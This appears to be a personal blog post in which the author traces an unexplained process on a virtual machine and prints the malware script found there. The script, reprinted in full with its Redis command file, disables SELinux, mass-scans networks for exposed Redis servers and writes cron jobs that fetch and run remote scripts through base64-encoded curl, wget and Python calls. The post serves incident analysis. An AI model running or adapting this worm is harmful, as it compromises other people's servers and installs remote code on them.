+++
title = 'A Journey into Unseen Threats on our VM'
date = 2024-05-04T19:51:57.5757+05:30
draft = false
tags =['hacking']
+++ 

As the sun set on a typical Saturday evening, I found myself engrossed in a blog titled "[Visualizing Malicious IP Addresses.](https://romeov.github.io/malicious_ip_addresses/malicious_ip_analysis.html)" The author shared clever ways to detect unauthorized attempts to access virtual machines via SSH, using commands like:

```sh
$ journalctl --since "-1d" -u sshd | grep "Failed password" | wc -l
$ journalctl --since "-1d" -u sshd | grep "Failed publickey" | wc -l
```

Curious, I decided to try these commands on our own VM. To my relief, the output was zero—no unauthorized login attempts. But my curiosity was piqued. I delved deeper into journalctl, discovering a command to display all Systemd logs with process IDs:

```sh
journalctl -f -o verbose
```

Upon executing the query on our VM, I encountered an intriguing error that immediately captured my attention.

```
 MESSAGE=/etc/.httpd/.../httpd: line 43: pnscan: command not found
```

"Pnscan?" I muttered to myself, furrowing my brows. A quick Google search revealed that "pnscan" is a tool for scanning network ports—a tool we certainly hadn't authorized on our VM.

Determined to unravel this mystery, I extracted the process ID from the journalctl logs and ventured into the depths of the `/proc` directory. Inside the PID folder, I hoped to glean more insights into this rogue process.

My first stop was the `cmdline` file, where I discovered the command that initiated the process 

```
 `/bin/bash/etc/.httpd/.../httpd`
```

It seemed innocuous enough—a command to run the Apache server. But something didn't add up. Next, I turned my attention to the `fd` folder, hoping to find clues in the standard output and standard error streams. To my surprise, there was nothing there—except for a mysterious file named `255`.

I cat the content of of the file and i got the below content

```sh
#!/bin/bash
setenforce 0 2>/dev/null
ulimit -u 50000
sleep 1
iptables -I INPUT 1 -p tcp --dport 6379 -j DROP 2>/dev/null
iptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT 2>/dev/null
sleep 1
      
rm -rf .dat .shard .ranges .lan 2>/dev/null
sleep 1
echo 'config set dbfilename "backup.db"' > .dat
echo 'save' >> .dat
echo 'flushall' >> .dat
echo 'config set dir "/var/spool/cron/"' >> .dat
echo 'config set dbfilename "root"' >> .dat
echo 'set backup1 "\n\n\n*/2 * * * * echo Y2QxIGh0dHA6Ly9zLm5hLWNzLmNvbS9iMmY2MjgvYi5zaAo=|base64 -d|bash|bash \n\n"' >> .dat
echo 'set backup2 "\n\n\n*/3 * * * * echo d2dldCAtcSAtTy0gaHR0cDovL3MubmEtY3MuY29tL2IyZjYyOC9iLnNoCg==|base64 -d|bash|bash\n\n"' >> .dat
echo 'set backup3 "\n\n\n*/4 * * * * echo Y3VybCBodHRwOi8vcy5uYS1jcy5jb20vYjJmNjI4L2Iuc2gK|base64 -d|bash|bash\n\n"' >> .dat
echo c2V0IGJhY2t1cDQgIlxuXG5cbkBob3VybHkgIHB5dGhvbiAtYyBcImltcG9ydCB1cmxsaWIyOyBwcmludCB1cmxsaWIyLnVybG9wZW4oXCdodHRwOi8vXFxcXHMublxcYS1jXFxzLmNcXG9cbS90LnNoXCcpLnJlYWQoKVwiID4uMTtjaG1vZCAreCAuMTsuLy4xXG5cbiIK|base64 -d >>.dat
echo 'save' >> .dat
echo 'config set dir "/tmp"' >> .dat
echo 'flushall' >> .dat
echo 'config set dir "/var/spool/cron/crontabs"' >> .dat
echo 'save' >> .dat
echo 'set backup1 "\n\n\n*/2 * * * * root echo Y2QxIGh0dHA6Ly9zLm5hLWNzLmNvbS9iMmY2MjgvYi5zaAo=|base64 -d|bash|bash \n\n"' >> .dat
echo 'set backup2 "\n\n\n*/3 * * * * root echo d2dldCAtcSAtTy0gaHR0cDovL3MubmEtY3MuY29tL2IyZjYyOC9iLnNoCg==|base64 -d|bash|bash\n\n"' >> .dat
echo 'set backup3 "\n\n\n*/4 * * * * root echo Y3VybCBodHRwOi8vcy5uYS1jcy5jb20vYjJmNjI4L2Iuc2gK|base64 -d|bash|bash\n\n"' >> .dat
echo c2V0IGJhY2t1cDQgIlxuXG5cbkBob3VybHkgIHB5dGhvbiAtYyBcImltcG9ydCB1cmxsaWIyOyBwcmludCB1cmxsaWIyLnVybG9wZW4oXCdodHRwOi8vXFxcXHMublxcYS1jXFxzLmNcXG9cbS90LnNoXCcpLnJlYWQoKVwiID4uMTtjaG1vZCAreCAuMTsuLy4xXG5cbiIK|base64 -d >>.dat
echo 'config set dir "/etc/cron.d/"' >> .dat
echo 'config set dbfilename "zzh"' >> .dat
echo 'save' >> .dat
echo 'config set dir "/etc/"' >> .dat
echo 'config set dbfilename "crontab"' >> .dat
echo 'save' >> .dat
sleep 1
pnx=pnscan
[ -x /usr/local/bin/pnscan ] && pnx=/usr/local/bin/pnscan
[ -x /usr/bin/pnscan ] && pnx=/usr/bin/pnscan
while true
do
for x in $( echo -e "47\n39\n8\n121\n106\n120\n123\n65\n3\n101\n139\n99\n63\n81\n44\n18\n119\n100\n42\n49\n118\n54\n1\n50\n114\n182\n52\n13\n34\n112\n115\n111\n116\n16\n35\n117\n124\n59\n36\n103\n82\n175\n122\n129\n45\n152\n159\n113\n15\n61\n180\n172\n157\n60\n218\n176\n58\n204\n140\n184\n150\n193\n223\n192\n75\n46\n188\n183\n222\n14\n104\n27\n221\n211\n132\n107\n43\n212\n148\n110\n62\n202\n95\n220\n154\n23\n149\n125\n210\n203\n185\n171\n146\n109\n94\n219\n134" | sort -R ); do
for y in $( seq 0 255 | sort -R ); do
$pnx -t512 -R '6f 73 3a 4c 69 6e 75 78' -W '2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a' $x.$y.0.0/16 6379 > .r.$x.$y.o
awk '/Linux/ {print $1, $3}' .r.$x.$y.o > .r.$x.$y.l
while read -r h p; do
cat .dat | redis-cli -h $h -p $p --raw &
done < .r.$x.$y.l
done
done
done
sleep 1
masscan --max-rate 10000 -p6379 --shard $( seq 1 22000 | sort -R | head -n1 )/22000 --exclude 255.255.255.255 0.0.0.0/0 2>/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .shard
sleep 1
while read -r h p; do
cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
done < .shard
sleep 1
masscan --max-rate 10000 -p6379 192.168.0.0/16 172.16.0.0/16 116.62.0.0/16 116.232.0.0/16 116.128.0.0/16 116.163.0.0/16 2>/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .ranges
sleep 1
while read -r h p; do
cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
done < .ranges
sleep 1
ip a | grep -oE '([0-9]{1,3}.?){4}/[0-9]{2}' 2>/dev/null | sed 's/\/\([0-9]\{2\}\)/\/16/g' > .inet
sleep 1
masscan --max-rate 10000 -p6379 -iL .inet | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .lan
sleep 1
while read -r h p; do
cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
done < .lan
sleep 60
rm -rf .dat .shard .ranges .lan 2>/dev/null

```


The script appears to conduct a Redis database backup, despite our VM not utilizing Redis. Of particular interest is the line:

```bash
masscan --max-rate 10000 -p6379 --shard $( seq 1 22000 | sort -R | head -n1 )/22000 --exclude 255.255.255.255 0.0.0.0/0 2>/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .shard
```

1. **masscan**: Performs a network scan.
   - `--max-rate 10000`: Limits packet sending to 10,000 per second.
   - `-p6379`: Targets port 6379, commonly associated with Redis.
   - `--shard $( seq 1 22000 | sort -R | head -n1 )/22000`: Divides the scan into shards, choosing a random shard from 1 to 22000.
   - `--exclude 255.255.255.255 0.0.0.0/0`: Excludes specific IP ranges from the scan.
   - `2>/dev/null`: Suppresses error messages.
   
2. **`| awk '{print $6, substr($4, 1, length($4)-4)}'`**:
   - Processes `masscan` output to extract status and IP/port information.
   
3. **`| sort | uniq > .shard`**:
   - Sorts and removes duplicates from the extracted data, saving it to a file named `.shard`.

In summary, the script attempts to scan and connect to Redis servers across different networks, possibly with intentions to execute commands outlined in the `.dat` file, which could be malicious. Furthermore, it tries to disable SELinux and adjust user limits, suggesting unauthorized access and system modification. This underscores the importance of vigilance in monitoring and securing systems against potential threats.

the content of .dat file was 

```sh
config set dbfilename "backup.db"
save
flushall
config set dir "/var/spool/cron/"
config set dbfilename "root"
set backup1 "\n\n\n*/2 * * * * echo Y2QxIGh0dHA6Ly9zLm5hLWNzLmNvbS9iMmY2MjgvYi5zaAo=|base64 -d|bash|bash \n\n"
set backup2 "\n\n\n*/3 * * * * echo d2dldCAtcSAtTy0gaHR0cDovL3MubmEtY3MuY29tL2IyZjYyOC9iLnNoCg==|base64 -d|bash|bash\n\n"
set backup3 "\n\n\n*/4 * * * * echo Y3VybCBodHRwOi8vcy5uYS1jcy5jb20vYjJmNjI4L2Iuc2gK|base64 -d|bash|bash\n\n"
set backup4 "\n\n\n@hourly  python -c \"import urllib2; print urllib2.urlopen(\'http://\\\\s.n\\a-c\\s.c\\o\m/t.sh\').read()\" >.1;chmod +x .1;./.1\n\n"
save
config set dir "/tmp"
flushall
config set dir "/var/spool/cron/crontabs"
save
set backup1 "\n\n\n*/2 * * * * root echo Y2QxIGh0dHA6Ly9zLm5hLWNzLmNvbS9iMmY2MjgvYi5zaAo=|base64 -d|bash|bash \n\n"
set backup2 "\n\n\n*/3 * * * * root echo d2dldCAtcSAtTy0gaHR0cDovL3MubmEtY3MuY29tL2IyZjYyOC9iLnNoCg==|base64 -d|bash|bash\n\n"
set backup3 "\n\n\n*/4 * * * * root echo Y3VybCBodHRwOi8vcy5uYS1jcy5jb20vYjJmNjI4L2Iuc2gK|base64 -d|bash|bash\n\n"
set backup4 "\n\n\n@hourly  python -c \"import urllib2; print urllib2.urlopen(\'http://\\\\s.n\\a-c\\s.c\\o\m/t.sh\').read()\" >.1;chmod +x .1;./.1\n\n"
config set dir "/etc/cron.d/"
config set dbfilename "zzh"
save
config set dir "/etc/"
config set dbfilename "crontab"
save
```

This script setup cron job to excute the script from remote url `http://s.na-cs.com/b2f628/b.sh`encoded in base64 format (`echo Y2QxIGh0dHA6Ly9zLm5hLWNzLmNvbS9iMmY2MjgvYi5zaAo=|base64`), I encountered an unexpected roadblock—the URL was inaccessible. Despite my efforts to uncover the script's intentions through the `/proc` file system, my investigation yielded no further insights.

Ultimately, I made the decision to delete the compromised VM and initiate the creation of a new one, ensuring the integrity of our system's security.
